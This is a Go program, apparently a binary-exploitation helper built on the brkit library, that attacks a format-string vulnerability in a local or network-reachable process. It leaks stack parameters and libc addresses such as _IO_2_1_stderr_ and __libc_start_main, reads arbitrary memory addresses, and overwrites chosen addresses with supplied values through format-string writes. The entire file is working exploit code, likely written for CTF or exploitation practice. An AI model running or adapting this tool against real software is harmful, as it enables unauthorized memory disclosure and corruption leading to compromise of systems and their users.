package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/stephen-fox/brkit/memory"
	"github.com/stephen-fox/brkit/process"
)

var (
	verbose    *log.Logger
	muyVerbose *log.Logger
)

func main() {
	isVerbose := flag.Bool("v", false, "Verbose output")
	isMuyVerbose := flag.Bool("vv", false, "Muy verbose output")

	flag.Parse()

	if *isVerbose {
		verbose = log.New(log.Writer(), log.Prefix(), log.Flags())
	}

	if *isMuyVerbose {
		verbose = log.New(log.Writer(), log.Prefix(), log.Flags())
		muyVerbose = log.New(log.Writer(), log.Prefix(), log.Flags())
	}

	var proc *process.Process
	if strings.Contains(flag.Arg(0), ":") {
		proc = process.DialOrExit("tcp", flag.Arg(0))
	} else {
		cmd := exec.Command(flag.Arg(0))
		proc = process.StartOrExit(cmd)
		log.Printf("pid: %d", cmd.Process.Pid)
	}
	proc.SetLogger(muyVerbose)

	writeMemoryLoop(proc)
}

func leakParams(proc *process.Process) {
	leaker := memory.NewFormatStringDPALeakerOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
		Verbose:      verbose,
	})

	if verbose != nil {
		verbose.Printf("format string is '%s'", leaker.FormatString(1))
	}

	log.Printf("press enter when ready")
	fmt.Scanln()

	log.Fatalln("need to re-do this work because of updated leak logic")

	// _IO_2_1_stderr_       - 0x7fefcc8be5c0 - 21
	// __libc_start_main+234 - 0x7fefcc725d0a - 45
	// _IO_file_jumps        - 0x7fefcc8bf4a0 - 28
	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
	__libc_start_main234 := leaker.MemoryAtParamOrExit(45)
	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)

	log.Printf("_IO_2_1_stderr_: %s | __libc_start_main+234: %s | _IO_file_jumps %s",
		_IO_2_1_stderr_, __libc_start_main234, _IO_file_jumps)
}

func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
	leaker := memory.NewFormatStringDPALeakerOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
		Verbose:      verbose,
	})

	if verbose != nil {
		verbose.Printf("format string is '%s'", leaker.FormatString(1))
	}

	for {
		log.Printf("please enter a target to find followed by 'enter':\n")
		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		pointerStr = pointerStr[0:len(pointerStr)-1]

		res, found := leaker.FindParamNumberOrExit([]byte(pointerStr))
		if found {
			log.Printf("format string param number for %s is %d", pointerStr, res)
		} else {
			log.Printf("failed to find '%s'", pointerStr)
		}
	}
}

func leakMemoryAtLoop(proc *process.Process) {
	leaker := memory.SetupFormatStringLeakViaDPAOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
		Verbose:      verbose,
	})

	if verbose != nil {
		verbose.Printf("format string is '%s'", leaker.FormatString())
	}

	for {
		log.Printf("please enter a memory address to read from followed by 'enter':\n")
		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}

		pointer, convErr := memory.HexStringToPointer(
			pointerStr[0:len(pointerStr)-1],
			memory.PointerMakerForX86(),
			64)
		if convErr != nil {
			log.Printf("failed to convert pointer string - %s", err)
			continue
		}

		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)

		raw := leaker.MemoryAtOrExit(pointer)

		log.Printf("read: 0x%x", raw)
	}
}

func writeMemoryLoop(proc *process.Process) {
	writer := memory.NewDPAFormatStringWriterOrExit(memory.DPAFormatStringWriterConfig{
		MaxWrite:  999,
		DPAConfig: memory.FormatStringDPAConfig{
			ProcessIOFn: func() memory.ProcessIO {
				return proc
			},
			MaxNumParams: 200,
			PointerSize:  8,
			Verbose:      verbose,
		},
	})

	if verbose != nil {
		str, err := writer.Lower32BitsFormatString(10)
		if err != nil {
			log.Fatalf("failed to get format string for verbose log - %s", err)
		}
		verbose.Printf("format string is 0x%x", str)
	}

	for {
		log.Printf("please enter a memory address to write to and a number followed by 'enter':\n")
		str, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}

		parts := strings.Split(strings.TrimSpace(str), " ")
		if len(parts) < 2 {
			log.Printf("please enter two values")
			continue
		}

		pointer, convErr := memory.HexStringToPointer(
			parts[0],
			memory.PointerMakerForX86(),
			64)
		if convErr != nil {
			log.Printf("failed to convert pointer string - %s", convErr)
			continue
		}

		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)

		num, convErr := strconv.Atoi(parts[1])
		if convErr != nil {
			log.Printf("failed to convert number string - %s", convErr)
			continue
		}

		writer.OverwriteLower32BitsAtOrExit(num, pointer)

		log.Printf("wrote %d to %s", num, pointer.HexString())
	}
}
